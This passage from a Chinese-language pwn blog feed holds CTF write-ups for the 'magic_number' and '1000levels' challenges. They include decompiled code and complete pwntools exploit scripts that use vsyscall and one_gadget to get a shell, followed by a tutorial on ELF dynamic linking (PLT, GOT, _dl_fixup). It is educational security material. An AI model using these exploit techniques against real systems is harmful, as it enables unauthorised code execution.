class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">一个固定地址的gadget</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="vsyscall" scheme="https://ixout.github.io/tags/vsyscall/"/>
    
  </entry>
  
  <entry>
    <title>elf动态链接</title>
    <link href="https://ixout.github.io/posts/19785/"/>
    <id>https://ixout.github.io/posts/19785/</id>
    <published>2023-07-23T02:22:35.000Z</published>
    <updated>2023-07-30T11:42:59.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="先知"><a href="#先知" class="headerlink" title="先知"></a>先知</h1><p>建议参考<a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">关于学习ret2_dl_runtime_resolve的总结 - ZikH26</a></p><p>需要先了解一些在动态连接中有巨大作用的section</p><h2 id="plt"><a href="#plt" class="headerlink" title=".plt"></a>.plt</h2><p><strong>所在segment:代码段</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到.got.plt中, 然后跳转到该函数; 或者直接在.got.plt中查找并跳转到对应外部函数(如果已经填充过).</p><p>一个plt表项有三个字段</p><ol><li>跳转到对应的got表的地址</li><li>压栈,该参数是对应函数在.rel.plt上的偏移</li><li>跳转到plt[0],plt[0]处的代码pushGOT[1]然后jmpGOT[2]</li></ol><h3 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h3><p><strong>所在segment:数据段</strong></p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>前者用于存放全局变量的地址中和不需要延迟绑定的函数的地址。</strong></p><p><strong>后者用于存放需要延迟绑定的函数的地址</strong></p><p>.got.plt相当于.plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为跳转回.plt的代码, 并执行查找.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址</li></ul><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="plt-got"><a href="#plt-got" class="headerlink" title=".plt.got"></a>.plt.got</h2><p><strong>所在segment:代码段</strong></p><p>.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了很多动态链接所需的关键信息，主要看DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><h2 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h2><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><h2 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h2><p>它是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p> 第一次调用库函数时</p><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc-2.23/elf/dl-runtime.c实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">    assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">elf dynamic link</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="elf" scheme="https://ixout.github.io/tags/elf/"/>
    
  </entry>
  
  <entry>
    <title>SunmerWeek2</title>
    <link href="https://ixout.github.io/posts/33749/"/>
    <id>https://ixout.github.io/posts/33749/</id>
    <published>2023-07-23T02:13:36.000Z</published>
    <updated>2023-07-30T13:02:54.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="先知"><a href="#先知" class="headerlink" title="先知"></a>先知</h2><p>建议参考<a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">关于学习ret2_dl_runtime_resolve的总结 - ZikH26</a></p><p>需要先了解一些在动态连接中有巨大作用的section</p><h3 id="plt"><a href="#plt" class="headerlink" title=".plt"></a>.plt</h3><p><strong>所在segment:代码段</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到.got.plt中, 然后跳转到该函数; 或者直接在.got.plt中查找并跳转到对应外部函数(如果已经填充过).</p><p>一个plt表项有三个字段</p><ol><li>跳转到对应的got表的地址</li><li>压栈,该参数是对应函数在.rel.plt上的偏移</li><li>跳转到plt[0],plt[0]处的代码pushGOT[1]然后jmpGOT[2]</li></ol><h3 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h3><p><strong>所在segment:数据段</strong></p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>前者用于存放全局变量的地址中和不需要延迟绑定的函数的地址。</strong></p><p><strong>后者用于存放需要延迟绑定的函数的地址</strong></p><p>.got.plt相当于.plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为跳转回.plt的代码, 并执行查找.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址</li></ul><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="plt-got"><a href="#plt-got" class="headerlink" title=".plt.got"></a>.plt.got</h3><p><strong>所在segment:代码段</strong></p><p>.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了很多动态链接所需的关键信息，主要看DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><p>它是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p> 第一次调用库函数时</p><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a 